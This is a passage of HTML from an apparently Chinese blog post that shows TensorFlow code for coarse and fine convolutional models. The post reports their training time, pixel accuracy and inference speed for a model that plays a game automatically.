</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">padding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'SAME'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd4d530132060-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd4d530132060-14\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_conv_bn_relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv4'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">64</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">128</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd4d530132060-15\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max_pool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">padding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'SAME'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd4d530132060-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd4d530132060-17\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_conv_bn_relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv5'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">128</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">256</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd4d530132060-18\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max_pool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">padding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'SAME'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd4d530132060-19\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd4d530132060-20\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">reshape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">256</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">23</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd4d530132060-21\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_fc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'fc1'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">256</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">23</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">256</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">keep_prob</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd4d530132060-22\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_fc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'fc2'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">256</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">keep_prob</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd4d530132060-23\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd4d530132060-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0095 seconds] -->\r\n<p>经过十小时的训练，coarse模型在测试集上达到了6像素的精度，实际测试精度大约为10像素，在测试机器（MacBook Pro Retina, 15-inch, Mid 2015, 2.2 GHz Intel Core i7）上inference时间0.4秒。这一模型可以很轻松的拿到超过1k的分数，这已经远远超过了人类水平和绝大多数自动算法的水平，日常娱乐完全够用，不过，你认为我们就此为止那就大错特错了~</p>\n<h2>Fine 模型</h2>\n<p>fine模型结构与coarse模型类似，参数量稍大，fine模型作为对coarse模型的refine操作，</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635abe0cd53458132587\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef forward(self, img, is_training, keep_prob, name='fine'):\r\n    with tf.name_scope(name):\r\n        with tf.variable_scope(name):\r\n            out = self.conv2d('conv1', img, [3, 3, self.input_channle, 16], 2)\r\n            # out = tf.layers.batch_normalization(out, name='bn1', training=is_training)\r\n            out = tf.nn.relu(out, name='relu1')\r\n\r\n            out = self.make_conv_bn_relu('conv2', out, [3, 3, 16, 64], 1, is_training)\r\n            out = tf.nn.max_pool(out, [1, 2, 2, 1], [1, 2, 2, 1], padding='SAME')\r\n\r\n            out = self.make_conv_bn_relu('conv3', out, [5, 5, 64, 128], 1, is_training)\r\n            out = tf.nn.max_pool(out, [1, 2, 2, 1], [1, 2, 2, 1], padding='SAME')\r\n\r\n            out = self.make_conv_bn_relu('conv4', out, [7, 7, 128, 256], 1, is_training)\r\n            out = tf.nn.max_pool(out, [1, 2, 2, 1], [1, 2, 2, 1], padding='SAME')\r\n\r\n            out = self.make_conv_bn_relu('conv5', out, [9, 9, 256, 512], 1, is_training)\r\n            out = tf.nn.max_pool(out, [1, 2, 2, 1], [1, 2, 2, 1], padding='SAME')\r\n\r\n            out = tf.reshape(out, [-1, 512 * 10 * 10])\r\n            out = self.make_fc('fc1', out, [512 * 10 * 10, 512], keep_prob)\r\n            out = self.make_fc('fc2', out, [512, 2], keep_prob)\r\n\r\n    return out</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd53458132587-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd53458132587-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd53458132587-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd53458132587-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd53458132587-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd53458132587-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd53458132587-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd53458132587-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd53458132587-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd53458132587-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd53458132587-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd53458132587-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd53458132587-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd53458132587-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd53458132587-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd53458132587-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd53458132587-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd53458132587-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd53458132587-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd53458132587-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd53458132587-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd53458132587-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd53458132587-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd53458132587-24\">24</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635abe0cd53458132587-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">forward</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">img</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">keep_prob</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">name</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'fine'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd53458132587-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">with </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">name_scope</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd53458132587-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">with </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">variable_scope</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd53458132587-4\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">conv2d</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv1'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">img</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">input_channle</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd53458132587-5\"><span class=\"crayon-h\">            </span><span class=\"crayon-p\"># out = tf.layers.batch_normalization(out, name='bn1', training=is_training)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd53458132587-6\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">name</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'relu1'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd53458132587-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd53458132587-8\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_conv_bn_relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv2'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">64</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd53458132587-9\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max_pool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">padding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'SAME'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd53458132587-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd53458132587-11\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_conv_bn_relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv3'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">64</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">128</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd53458132587-12\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max_pool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">padding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'SAME'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd53458132587-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd53458132587-14\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_conv_bn_relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv4'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">128</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">256</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd53458132587-15\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max_pool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">padding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'SAME'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd53458132587-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd53458132587-17\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_conv_bn_relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv5'</span><span 